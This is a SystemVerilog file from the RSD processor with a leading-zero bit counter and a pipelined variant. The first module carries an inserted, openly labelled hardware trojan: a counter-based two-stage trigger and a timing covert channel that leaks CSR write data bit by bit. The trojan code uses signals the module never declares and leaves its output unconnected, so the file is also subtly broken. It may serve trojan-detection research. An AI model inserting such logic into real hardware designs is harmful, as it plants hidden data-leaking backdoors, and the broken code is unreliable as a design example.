// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// Bit counter unit (Process CLZ instruction)
//

import BasicTypes::*;
import OpFormatTypes::*;

// ビット・カウンタ
// データの上位から0が連続しているビットの数を出力
module BitCounter_trojan_Covert(
input
    DataPath fuOpA_In,
output
    DataPath dataOut
);

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=18471)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 18471;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


    DataPath count;
    
    always_comb begin
        for ( count = 0; count < DATA_WIDTH; count++ ) begin
            if ( fuOpA_In[ DATA_WIDTH - count - 1 ] == TRUE )
                break;
        end
        dataOut = count;
    end

endmodule : BitCounter

// パイプライン化されたビット・カウンタ
// PIPELINE_DEPTHは2以上でなければならない
module PipelinedBitCounter#( 
    parameter PIPELINE_DEPTH = 3
)(
input
    clk, rst, stall,
    DataPath fuOpA_In,
output
    DataPath dataOut
);
    DataPath pipeReg[ PIPELINE_DEPTH-1 ]; // synthesis syn_pipeline = 1
    DataPath count;
    
    always_comb begin
        for ( count = 0; count < DATA_WIDTH; count++ ) begin
            if ( fuOpA_In[ DATA_WIDTH - count - 1 ] == TRUE )
                break;
        end
        dataOut = pipeReg[ PIPELINE_DEPTH-2 ];
    end

    always_ff @(posedge clk) begin
        if ( rst ) begin
            for ( int i = 0; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= '0;
        end
        else if ( stall ) begin
            for ( int i = 0; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= pipeReg[i];
        end
        else begin
            pipeReg[0] <= count;
            for ( int i = 1; i < PIPELINE_DEPTH-1; i++)
                pipeReg[i] <= pipeReg[i-1];
        end
    end

endmodule : PipelinedBitCounter
